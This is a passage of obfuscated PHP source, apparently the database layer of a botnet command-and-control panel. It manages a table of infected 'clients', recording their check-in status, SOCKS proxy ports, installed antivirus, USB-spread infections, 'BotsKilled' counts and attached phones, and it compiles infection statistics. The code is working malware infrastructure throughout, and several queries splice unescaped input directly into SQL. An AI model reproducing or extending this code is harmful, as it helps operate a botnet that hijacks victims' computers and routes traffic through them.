        $_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_ = parent::Query("SELECT * FROM " . $this->pdbname . ".clients WHERE GUID = UNHEX('" . $guid . "') LIMIT 1");
        if (!$_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_) {
            return NULL;
        }
        if (@mysql_num_rows($_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_) == 0) {
            return NULL;
        }
        return @mysql_fetch_assoc($_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_);
    }
    public function GetClientByGuidEx($guid)
    {
        if (strlen($guid) == 0) {
            return NULL;
        }
        $guid = bin2hex($guid);
        $_obfuscated_0D3429283B11260826151228053E173F08061F10044011_ = "SELECT * FROM " . $this->pdbname . ".clients WHERE GUID = UNHEX('" . $guid . "') LIMIT 1";
        $_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_ = parent::Query($_obfuscated_0D3429283B11260826151228053E173F08061F10044011_);
        if (!$_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_) {
            $_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_ = parent::Query($_obfuscated_0D3429283B11260826151228053E173F08061F10044011_);
        }
        if (!$_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_) {
            return NULL;
        }
        if (@mysql_num_rows($_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_) == 0) {
            return NULL;
        }
        return @mysql_fetch_assoc($_obfuscated_0D0A0B281928195C3D040B3313310E2813123C313C3111_);
    }
    public function GetClientById($client_id = 0)
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".clients WHERE id = '" . $client_id . "' LIMIT 1");
    }
    public function SortNameToColumnName($sort_type)
    {
        if ($sort_type == "sortie_status") {
            return "ClientStatus";
        }
        if ($sort_type == "sortie_os") {
            return "OS";
        }
        if ($sort_type == "sortie_installdate") {
            return "FirstCheckIn";
        }
        if ($sort_type == "sortie_lastcheckin") {
            return "LastCheckIn";
        }
        if ($sort_type == "sortie_ip") {
            return "LastIP";
        }
        if ($sort_type == "sortie_group") {
            return "GroupName";
        }
        if ($sort_type == "sortie_bk") {
            return "BotsKilled";
        }
        if ($sort_type == "sortie_location") {
            return "Locale";
        }
        if ($sort_type == "sortie_av") {
            return "AvsInstalled";
        }
        if ($sort_type == "sortie_version") {
            return "Version";
        }
        if ($sort_type == "sortie_socks") {
            return "SocksPort";
        }
        return "";
    }
    public function GetClientsBelowVer18()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ((Version & 0xFFFF) & 0xFF) = 1 AND (((Version & 0xFFFF) >> 8) & 0xFF) < 8");
        if (!$_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            return 0;
        }
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function GetClientsVer1806AndUp($bDoNotCountDeadBots)
    {
        $_obfuscated_0D3B14213605241E020B3005261D13125C280119395B32_ = $bDoNotCountDeadBots ? "ClientStatus != " . BOT_STATUS_DEAD . " AND" : "";
        $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = "SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3B14213605241E020B3005261D13125C280119395B32_ . " ((Version & 0xFFFF) & 0xFF) = 1 AND ( ((((Version & 0xFFFF) >> 8) & 0xFF) = 8 AND ((((Version >> 16) & 0xFFFF) >> 8) & 0xFF) > 5) OR ";
        $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ .= " (((Version & 0xFFFF) >> 8) & 0xFF) > 8)";
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
        if (!$_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            return 0;
        }
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function GetClients($max_grab, $use_filters = false, $filter_attributes = 0, $filter_os = 0, $filter_locales = "")
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".clients WHERE ClientStatus != " . BOT_STATUS_DEAD . " ORDER BY ClientStatus ASC LIMIT " . $max_grab);
    }
    public function GetClientsRange($s_start, $s_end)
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".clients WHERE ClientStatus != " . BOT_STATUS_DEAD . " ORDER BY ClientStatus ASC, FirstCheckIn DESC LIMIT " . $s_start . ", " . $s_end);
    }
    public function GetClientsRangeEx($s_start, $s_end, $sort_type, $sort_order)
    {
        if (strcasecmp($sort_order, "asc") != 0 && strcasecmp($sort_order, "desc") != 0) {
            return NULL;
        }
        if ($sort_order == NULL || strlen($sort_order) == 0) {
            $sort_order = "ASC";
        }
        $sort_type = $this->SortNameToColumnName($sort_type);
        $sort_order = strtoupper($sort_order);
        if ($sort_type == NULL || strlen($sort_type) < 3) {
            $sort_type = "ClientStatus";
        }
        return parent::Query("SELECT * FROM " . $this->pdbname . ".clients WHERE ClientStatus != " . BOT_STATUS_DEAD . " ORDER BY " . $sort_type . " " . $sort_order . ", FirstCheckIn DESC LIMIT " . $s_start . ", " . $s_end);
    }
    public function GetFavoriteClientsRangeEx($s_start, $s_end, $sort_type, $sort_order)
    {
        if (strcasecmp($sort_order, "asc") != 0 && strcasecmp($sort_order, "desc") != 0) {
            return NULL;
        }
        if ($sort_order == NULL || strlen($sort_order) == 0) {
            $sort_order = "ASC";
        }
        $sort_type = $this->SortNameToColumnName($sort_type);
        $sort_order = strtoupper($sort_order);
        if ($sort_type == NULL || strlen($sort_type) < 3) {
            $sort_type = "ClientStatus";
        }
        return parent::Query("SELECT * FROM " . $this->pdbname . ".clients WHERE ClientStatus != " . BOT_STATUS_DEAD . " AND RecordAttributes & " . BOT_RECORD_IS_FAVORITE . " ORDER BY " . $sort_type . " " . $sort_order . ", FirstCheckIn DESC LIMIT " . $s_start . ", " . $s_end);
    }
    public function GetClientsWithSocks()
    {
        return parent::Query("SELECT LastIP, SocksPort, Locale FROM " . $this->pdbname . ".clients WHERE SocksPort > 0 AND ClientStatus = " . BOT_STATUS_ONLINE);
    }
    public function GetOsStringFromMask($os_mask)
    {
        if ($os_mask == 0) {
            return "Unknown";
        }
        if ($os_mask & WINDOWS_VERSION_W10) {
            return "Windows 10";
        }
        if ($os_mask & WINDOWS_VERSION_W8 && $os_mask & WINDOWS_VERSION_SP_SP1) {
            return "Windows 8.1";
        }
        if ($os_mask & WINDOWS_VERSION_W8) {
            return "Windows 8";
        }
        if ($os_mask & WINDOWS_VERSION_W7) {
            return "Windows 7";
        }
        if ($os_mask & WINDOWS_VERSION_VS) {
            return "Windows Vista";
        }
        if ($os_mask & WINDOWS_VERSION_XP) {
            return "Windows XP";
        }
        if ($os_mask & WINDOWS_VERSION_S2008 || $os_mask & WINDOWS_VERSION_S2008R2) {
            return "Windows Server 2008";
        }
        if ($os_mask & WINDOWS_VERSION_S2003) {
            return "Windows Server 2003";
        }
        return "Unknown";
    }
    public function GetOsBitFromMask($os_mask)
    {
        if ($os_mask == 0) {
            return "";
        }
        if ($os_mask & WINDOWS_VERSION_BIT_64) {
            return " (x64)";
        }
        return " (x86)";
    }
    public function GetOsServicePackFromMask($os_mask)
    {
        if ($os_mask == 0) {
            return "";
        }
        if ($os_mask & WINDOWS_VERSION_SP_SP1) {
            return " SP1";
        }
        if ($os_mask & WINDOWS_VERSION_SP_SP2) {
            return " SP2";
        }
        if ($os_mask & WINDOWS_VERSION_SP_SP3) {
            return " SP3";
        }
        return "";
    }
    public function GetOsProductDescFromMask($os_mask)
    {
        if ($os_mask == 0) {
            return "";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_STARTER) {
            return " - Starter";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_HOME_BASIC) {
            return " - Home Basic";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_HOME_PREMIUM) {
            return " - Home Premium";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_PROFESSIONAL) {
            return " - Professional";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_ULTIMATE) {
            return " - Ultimate";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_BUSINESS) {
            return " - Business";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_ENTERPRISE) {
            return " - Enterprise";
        }
        if ($os_mask & WINDOWS_VERSION_PRODUCT_DATACENTER) {
            return " - Datacenter";
        }
        return "";
    }
    public function GetFullOsStringFromMask($os_mask, $bIncludeProductType)
    {
        if ($os_mask == 0) {
            return "Unknown";
        }
        $_obfuscated_0D0C2F0505232B0F5C2E3F0B22102A221F17120E041122_ = $this->GetOsStringFromMask($os_mask);
        $_obfuscated_0D0C2F0505232B0F5C2E3F0B22102A221F17120E041122_ .= $this->GetOsServicePackFromMask($os_mask);
        $_obfuscated_0D0C2F0505232B0F5C2E3F0B22102A221F17120E041122_ .= $this->GetOsBitFromMask($os_mask);
        if ($bIncludeProductType == true) {
            $_obfuscated_0D0C2F0505232B0F5C2E3F0B22102A221F17120E041122_ .= $this->GetOsProductDescFromMask($os_mask);
        }
        return $_obfuscated_0D0C2F0505232B0F5C2E3F0B22102A221F17120E041122_;
    }
    public function GetCountAndFreeResult($query_res = NULL)
    {
        $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_ = 0;
        if ($query_res) {
            list($_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_) = @mysql_fetch_row($query_res);
            @mysql_free_result($query_res);
        }
        return $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_;
    }
    public function FormatGroupQueryString($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = "";
        if (isset($groupname) && 0 < strlen($groupname)) {
            $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = " AND GroupName='" . _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($groupname) . "'";
        }
        return $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_;
    }
    public function Status_CorrectAllOnlineStatus()
    {
        global $sqlSettings;
        $_obfuscated_0D3801252A29032F0F3D0235162E142D1D170932303D22_ = time() - $sqlSettings->KnockInterval * 63;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".clients SET ClientStatus = '" . BOT_STATUS_OFFLINE . "' WHERE LastCheckIn < " . $_obfuscated_0D3801252A29032F0F3D0235162E142D1D170932303D22_ . " AND ClientStatus < " . BOT_STATUS_DEAD);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Status_CorrectAllDeadStatus()
    {
        global $sqlSettings;
        $_obfuscated_0D3801252A29032F0F3D0235162E142D1D170932303D22_ = time() - $sqlSettings->AbsentLimit * 84600;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".clients SET ClientStatus = '" . BOT_STATUS_DEAD . "' WHERE LastCheckIn < " . $_obfuscated_0D3801252A29032F0F3D0235162E142D1D170932303D22_ . " AND ClientStatus < " . BOT_STATUS_DELETED);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalBots($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalBotsEx($groupname, $req_ClientStatus, $req_ClientStatus_Operator, &$TotalBotsAll)
    {
        $_obfuscated_0D2F3F0D021A32392C28035B212A385B3D012D04131E32_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ = $this->Stats_Build_ClientStatus_Query($req_ClientStatus, $req_ClientStatus_Operator);
        $_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_ = "";
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = NULL;
        $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_ = NULL;
        $_obfuscated_0D141213155C1F3D35212B301D090C170D2A1512091F11_ = 0;
        $_obfuscated_0D2A283412330E3D23120A1A1D5B15390611180F402E01_ = 0;
        $_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_ = "SELECT\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " " . $_obfuscated_0D2F3F0D021A32392C28035B212A385B3D012D04131E32_ . ") AS 'TOTAL_WITH_SPECIFICATIONS',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D2F3F0D021A32392C28035B212A385B3D012D04131E32_ . ") AS 'TOTAL_ALL'";
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = parent::Query($_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_);
        if ($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_) {
            if ($_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_ = mysql_fetch_assoc($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_)) {
                $_obfuscated_0D2A283412330E3D23120A1A1D5B15390611180F402E01_ = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["TOTAL_WITH_SPECIFICATIONS"];
                $_obfuscated_0D141213155C1F3D35212B301D090C170D2A1512091F11_ = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["TOTAL_ALL"];
            }
            $this->GetCountAndFreeResult($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_);
        }
        $TotalBotsAll = $_obfuscated_0D141213155C1F3D35212B301D090C170D2A1512091F11_;
        return $_obfuscated_0D2A283412330E3D23120A1A1D5B15390611180F402E01_;
    }
    public function Stats_GetTotalBotsEvenDead($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalBotsByGroup($groupname = "")
    {
        if (strlen($groupname) == 0) {
            return $this->Stats_GetTotalBots();
        }
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND GroupName = '" . $groupname . "'");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalBotsByGroupEx($groupname, $req_ClientStatus, $req_ClientStatus_Operator)
    {
        $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ = $this->Stats_Build_ClientStatus_Query($req_ClientStatus, $req_ClientStatus_Operator);
        $_obfuscated_0D2D15241C182F2817293826152C020A0836341D0C2132_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($groupname);
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND GroupName = '" . $_obfuscated_0D2D15241C182F2817293826152C020A0836341D0C2132_ . "'");
        return $this->GetCountAndFreeResult($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_);
    }
    public function Stats_GetTotalBotsFromUsb($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_BOT_SOURCE_USB . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalDirtyBots()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND RecordAttributes & " . BOT_RECORD_IS_DIRTY);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalFavoriteBots()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND RecordAttributes & " . BOT_RECORD_IS_FAVORITE);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalGroups()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(GroupName) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' GROUP BY `GroupName`");
        $_obfuscated_0D1F1B34081136070D5B0D2A31313C39112A2501273901_ = 0;
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            $_obfuscated_0D1F1B34081136070D5B0D2A31313C39112A2501273901_ = (int) @mysql_num_rows($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return $_obfuscated_0D1F1B34081136070D5B0D2A31313C39112A2501273901_;
    }
    public function Stats_GetLikelyDuplicateBotCount()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(*) as BotDups,SUM(duplist.BotDups) as TotalDups  FROM (SELECT COUNT(id) as BotDups FROM " . $this->pdbname . ".clients GROUP BY OS, CompNameUsername, VideoCardName, CpuName HAVING COUNT(id) > 1)as duplist");
        $_obfuscated_0D10010226285C2C0C151901391D101D311B173B344001_ = 0;
        $row = NULL;
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            if ($row = mysql_fetch_assoc($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_)) {
                $_obfuscated_0D10010226285C2C0C151901391D101D311B173B344001_ = (int) $row["TotalDups"] - (int) $row["BotDups"];
            }
            @mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return $_obfuscated_0D10010226285C2C0C151901391D101D311B173B344001_;
    }
    public function Stats_GetBotsOnline($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus = '" . BOT_STATUS_ONLINE . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOffline($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus = '" . BOT_STATUS_OFFLINE . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOnline_24h($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOnline_3h($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 3600 * 3;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOnline_3d($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600 * 3;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOnline_5d($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600 * 5;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOnline_7d($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600 * 7;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsOnline_24h_FromUsb($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "' AND ClientAttributes & " . BOT_ATTRIBUTE_BOT_SOURCE_USB . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetNewBots_24h($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE FirstCheckIn > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetDeadBots($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE (ClientStatus = '" . BOT_STATUS_DEAD . "' OR ClientStatus = '" . BOT_STATUS_DELETED . "')" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithNetFramework($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_NET_FRAMEWORK . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithJava($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_JAVA . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithRouter($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_ROUTER . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithPhoneDevice($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND (ClientAttributes & " . BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE . " OR ClientAttributes & " . BOT_ATTRIBUTE_HAS_APPLE_DEVICE . ")" . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithSamsungDevices($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
